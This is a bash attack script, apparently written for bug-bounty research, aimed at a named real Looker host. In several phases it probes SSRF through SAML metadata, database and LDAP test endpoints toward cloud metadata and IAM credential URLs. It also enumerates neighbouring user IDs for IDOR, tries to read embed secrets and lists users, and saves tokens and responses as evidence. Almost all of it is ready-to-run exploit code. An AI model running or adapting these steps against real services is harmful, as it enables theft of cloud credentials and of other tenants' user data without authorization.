#!/usr/bin/env bash
# looker-ssrf-auth-attack.sh — Post-auth attack against trial.looker.com
#
# Prerequisites:
#   export LOOKER_HOST="trial.looker.com"   (or test.looker.com)
#   export LOOKER_CLIENT_ID="<api_client_id>"
#   export LOOKER_CLIENT_SECRET="<api_client_secret>"
#
# If you only have username/password (no API credentials):
#   export LOOKER_EMAIL="your@email.com"
#   export LOOKER_PASSWORD="yourpassword"
#   Set LOOKER_CLIENT_ID="" and the script will try web session auth.
#
# Attack phases:
#   A — Authenticate and get Bearer token
#   B — SSRF via /fetch_and_parse_saml_idp_metadata (internal URL fetch)
#   C — SSRF via /connections/test (database connection to arbitrary host)
#   D — SSRF via /ldap_config/test_connection
#   E — SSRF via /integrations/{id}/test
#   F — IDOR: access other users' data via /users/{id}
#   G — Embed secret disclosure via /embed_config/secrets
#   H — SSO URL generation for arbitrary user

set -uo pipefail

LOOKER_HOST="${LOOKER_HOST:-trial.looker.com}"
CLIENT_ID="${LOOKER_CLIENT_ID:-}"
CLIENT_SECRET="${LOOKER_CLIENT_SECRET:-}"
LOOKER_EMAIL="${LOOKER_EMAIL:-}"
LOOKER_PASSWORD="${LOOKER_PASSWORD:-}"

OUT_DIR="results/wiz.io/evidence/looker-ssrf"
mkdir -p "$OUT_DIR"

# IMDS and internal targets for SSRF
SSRF_TARGETS=(
  "http://169.254.169.254/latest/meta-data/"
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  "http://169.254.169.254/latest/dynamic/instance-identity/document"
  "http://metadata.google.internal/computeMetadata/v1/?recursive=true"
  "http://metadata.google.internal/computeMetadata/v1/project/project-id"
  "http://169.254.169.254/computeMetadata/v1/"
  "http://localhost/"
  "http://127.0.0.1:8080/"
  "http://10.0.0.1/"
)

RED='\033[0;31m'; YLW='\033[1;33m'; GRN='\033[0;32m'; BLU='\033[0;34m'; NC='\033[0m'
hit()  { echo -e "${GRN}[HIT]${NC} $*"; }
info() { echo -e "${BLU}[INF]${NC} $*"; }
warn() { echo -e "${YLW}[WRN]${NC} $*"; }
crit() { echo -e "${RED}[!!!]${NC} $*"; }

echo "═══════════════════════════════════════════════════"
echo " PHASE A — Authentication"
echo " Target: https://$LOOKER_HOST"
echo "═══════════════════════════════════════════════════"

TOKEN=""

if [[ -n "$CLIENT_ID" && -n "$CLIENT_SECRET" ]]; then
  info "Authenticating with API client credentials..."
  AUTH_RESP=$(curl -sk -X POST \
    "https://$LOOKER_HOST/api/4.0/login" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}")
  TOKEN=$(echo "$AUTH_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token',''))" 2>/dev/null)
  EXPIRES=$(echo "$AUTH_RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('expires_in',''))" 2>/dev/null)

  if [[ -n "$TOKEN" ]]; then
    hit "API auth successful — token expires in ${EXPIRES}s"
    echo "$TOKEN" > "$OUT_DIR/bearer_token.txt"
  else
    warn "API auth failed: $AUTH_RESP"
  fi
fi

# Fallback: try web session if no API token
if [[ -z "$TOKEN" && -n "$LOOKER_EMAIL" && -n "$LOOKER_PASSWORD" ]]; then
  info "Trying web session authentication..."
  CSRF=$(curl -sk "https://$LOOKER_HOST/login" | \
    grep -o 'csrf-token" value="[^"]*"' | grep -o '"[^"]*"$' | tr -d '"')
  info "CSRF token: $CSRF"
  if [[ -n "$CSRF" ]]; then
    WEB_RESP=$(curl -sk -c "$OUT_DIR/cookies.txt" -X POST \
      "https://$LOOKER_HOST/login" \
      -H "Content-Type: application/x-www-form-urlencoded" \
      -H "Referer: https://$LOOKER_HOST/login" \
      -d "csrf-token=${CSRF}&email=${LOOKER_EMAIL}&password=${LOOKER_PASSWORD}" \
      -w "\nHTTP %{http_code}" \
      -L --max-redirs 3)
    HTTP_CODE=$(echo "$WEB_RESP" | tail -1)
    info "Web login → HTTP $HTTP_CODE"
    if [[ "$HTTP_CODE" == "200" ]]; then
      hit "Web session auth — using cookie jar"
      TOKEN="WEB_SESSION"
    fi
  fi
fi

if [[ -z "$TOKEN" ]]; then
  crit "No authentication token obtained. Set LOOKER_CLIENT_ID + LOOKER_CLIENT_SECRET"
  crit "Or set LOOKER_EMAIL + LOOKER_PASSWORD for web session auth"
  echo ""
  echo "To get API credentials: Admin → Users → Edit user → API3 Keys → New API3 Key"
  exit 1
fi

# Helper: make authenticated API request
_api() {
  local method="$1" path="$2"
  shift 2
  if [[ "$TOKEN" == "WEB_SESSION" ]]; then
    curl -sk --max-time 20 -b "$OUT_DIR/cookies.txt" \
      -X "$method" "https://$LOOKER_HOST${path}" "$@"
  else
    curl -sk --max-time 20 \
      -H "Authorization: Bearer $TOKEN" \
      -X "$method" "https://$LOOKER_HOST${path}" "$@"
  fi
}

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE B — SSRF via /fetch_and_parse_saml_idp_metadata"
echo " (Server fetches arbitrary URL to parse SAML XML)"
echo "═══════════════════════════════════════════════════"

for SSRF_URL in "${SSRF_TARGETS[@]}"; do
  info "Testing SSRF target: $SSRF_URL"
  RESP=$(_api POST "/api/4.0/fetch_and_parse_saml_idp_metadata" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"${SSRF_URL}\"}")
  HTTP_CODE=$(_api POST "/api/4.0/fetch_and_parse_saml_idp_metadata" \
    -H "Content-Type: application/json" \
    -d "{\"url\":\"${SSRF_URL}\"}" \
    -o /dev/null -w "%{http_code}" 2>/dev/null)

  # Detect SSRF hit: non-XML responses indicate the server fetched the URL
  if echo "$RESP" | grep -qi "ami-id\|instance-id\|security-credentials\|iam\|metadata\|project-id\|token_uri"; then
    crit "SSRF CONFIRMED! Got internal metadata from: $SSRF_URL"
    crit "Response: $RESP"
    echo "$RESP" > "$OUT_DIR/ssrf-saml-CONFIRMED-$(date +%s).txt"
  elif echo "$RESP" | grep -qi "error\|invalid\|invalid_url\|not valid\|invalid saml"; then
    info "Server tried to fetch (got SAML parse error) — may be SSRF (got response from internal host)"
    info "Response: ${RESP:0:200}"
  else
    info "HTTP $HTTP_CODE — Response: ${RESP:0:150}"
  fi
done

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE C — SSRF via /connections/test (DB connection to arbitrary host)"
echo "═══════════════════════════════════════════════════"

# Test database connection to IMDS — Looker makes a TCP connection to the host:port
for SSRF_HOST in "169.254.169.254" "metadata.google.internal"; do
  info "Testing DB connection SSRF to: $SSRF_HOST"

  # BigQuery connection pointing to internal host
  for DB_TYPE in "bigquery" "mysql" "postgres" "redshift"; do
    RESP=$(_api POST "/api/4.0/connections/test" \
      -H "Content-Type: application/json" \
      -d "{\"name\":\"ssrf_test_${RANDOM}\",\"dialect_name\":\"${DB_TYPE}\",\"host\":\"${SSRF_HOST}\",\"port\":\"80\",\"username\":\"probe\",\"password\":\"probe\",\"database\":\"probe\"}" \
      -w "\nHTTP %{http_code}")
    HTTP_CODE=$(echo "$RESP" | tail -1)
    BODY=$(echo "$RESP" | head -c 500)
    if echo "$BODY" | grep -qi "connection refused\|timeout\|host\|connection.*failed"; then
      hit "DB SSRF $DB_TYPE → $SSRF_HOST: got TCP-level response: $BODY"
      echo "$BODY" > "$OUT_DIR/ssrf-connection-${DB_TYPE}-${SSRF_HOST}.txt"
    else
      info "$DB_TYPE → $SSRF_HOST: HTTP $HTTP_CODE"
    fi
  done
done

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE D — SSRF via /ldap_config/test_connection"
echo "═══════════════════════════════════════════════════"

for SSRF_HOST in "169.254.169.254:80" "metadata.google.internal:80" "localhost:80"; do
  info "LDAP SSRF to: $SSRF_HOST"
  RESP=$(_api PUT "/api/4.0/ldap_config/test_connection" \
    -H "Content-Type: application/json" \
    -d "{\"server\":\"ldap://${SSRF_HOST}\",\"port\":80}" \
    -w "\nHTTP %{http_code}")
  HTTP_CODE=$(echo "$RESP" | tail -1)
  BODY=$(echo "$RESP" | head -c 400)
  if echo "$BODY" | grep -qiv "refused\|LDAP error\|connect error" && [[ "$HTTP_CODE" != "401" ]]; then
    hit "LDAP SSRF to $SSRF_HOST: HTTP $HTTP_CODE — $BODY"
  else
    info "LDAP $SSRF_HOST: HTTP $HTTP_CODE"
  fi
done

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE E — IDOR: access other users via /users/{id}"
echo "═══════════════════════════════════════════════════"

info "Getting our own user ID first..."
MY_USER=$(_api GET "/api/4.0/user/me")
MY_ID=$(echo "$MY_USER" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id',''))" 2>/dev/null)
MY_EMAIL=$(echo "$MY_USER" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email',''))" 2>/dev/null)
info "My user ID: $MY_ID, email: $MY_EMAIL"

# Enumerate user IDs adjacent to ours
if [[ -n "$MY_ID" && "$MY_ID" =~ ^[0-9]+$ ]]; then
  info "Testing adjacent user IDs for IDOR..."
  for OFFSET in -5 -4 -3 -2 -1 1 2 3 4 5 10 100 1000; do
    TARGET_ID=$((MY_ID + OFFSET))
    [[ $TARGET_ID -lt 1 ]] && continue
    RESP=$(_api GET "/api/4.0/users/${TARGET_ID}")
    HTTP_CODE=$(_api GET "/api/4.0/users/${TARGET_ID}" -o /dev/null -w "%{http_code}")
    TARGET_EMAIL=$(echo "$RESP" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('email','N/A'))" 2>/dev/null)
    if [[ "$HTTP_CODE" == "200" && -n "$TARGET_EMAIL" && "$TARGET_EMAIL" != "$MY_EMAIL" ]]; then
      crit "IDOR! Can access user $TARGET_ID ($TARGET_EMAIL) — I am user $MY_ID ($MY_EMAIL)"
      echo "$RESP" > "$OUT_DIR/idor-user-${TARGET_ID}.json"
    elif [[ "$HTTP_CODE" == "200" ]]; then
      info "User $TARGET_ID → accessible (same account)"
    fi
  done
fi

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE F — Embed secret disclosure"
echo "═══════════════════════════════════════════════════"

info "Fetching embed config secrets..."
EMBED_SECRETS=$(_api GET "/api/4.0/embed_config/secrets")
HTTP_CODE=$(_api GET "/api/4.0/embed_config/secrets" -o /dev/null -w "%{http_code}")
if [[ "$HTTP_CODE" == "200" ]]; then
  hit "Embed secrets accessible! HTTP $HTTP_CODE"
  echo "$EMBED_SECRETS" | python3 -m json.tool 2>/dev/null | head -50
  echo "$EMBED_SECRETS" > "$OUT_DIR/embed-secrets.json"
else
  info "Embed secrets: HTTP $HTTP_CODE (needs admin)"
fi

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE G — SSO URL generation for arbitrary user"
echo "═══════════════════════════════════════════════════"

info "Testing embed SSO URL generation..."
SSO_RESP=$(_api POST "/api/4.0/embed/sso_url" \
  -H "Content-Type: application/json" \
  -d "{\"target_url\":\"/\",\"session_length\":3600,\"force_logout_login\":false}")
HTTP_CODE=$(_api POST "/api/4.0/embed/sso_url" \
  -H "Content-Type: application/json" \
  -d "{\"target_url\":\"/\",\"session_length\":3600,\"force_logout_login\":false}" \
  -o /dev/null -w "%{http_code}")
info "SSO URL generation: HTTP $HTTP_CODE"
[[ "$HTTP_CODE" == "200" ]] && echo "$SSO_RESP" | head -c 500

echo ""
echo "═══════════════════════════════════════════════════"
echo " PHASE H — All user enumeration"
echo "═══════════════════════════════════════════════════"

info "Fetching all users (admin check)..."
ALL_USERS=$(_api GET "/api/4.0/users?limit=20")
HTTP_CODE=$(_api GET "/api/4.0/users?limit=20" -o /dev/null -w "%{http_code}")
if [[ "$HTTP_CODE" == "200" ]]; then
  hit "User enumeration: HTTP $HTTP_CODE"
  echo "$ALL_USERS" | python3 -c "
import sys,json
users=json.load(sys.stdin)
print(f'Total users visible: {len(users)}')
for u in users[:10]:
    print(f'  ID:{u.get(\"id\")} email:{u.get(\"email\")} role:{u.get(\"role\")}')
" 2>/dev/null
  echo "$ALL_USERS" > "$OUT_DIR/user-enumeration.json"
fi

echo ""
echo "═══════════════════════════════════════════════════"
echo " SUMMARY"
echo "═══════════════════════════════════════════════════"
echo "Evidence saved to: $OUT_DIR/"
ls -la "$OUT_DIR/" 2>/dev/null
echo ""
echo "Priority findings to report:"
echo "  1. SSRF via /fetch_and_parse_saml_idp_metadata (CRITICAL if IMDS accessible)"
echo "  2. SSRF via /connections/test (HIGH — SSRF to internal hosts)"
echo "  3. IDOR via /users/{id} (HIGH — cross-tenant user data)"
echo "  4. Embed secrets disclosure (HIGH — if accessible to non-admin)"
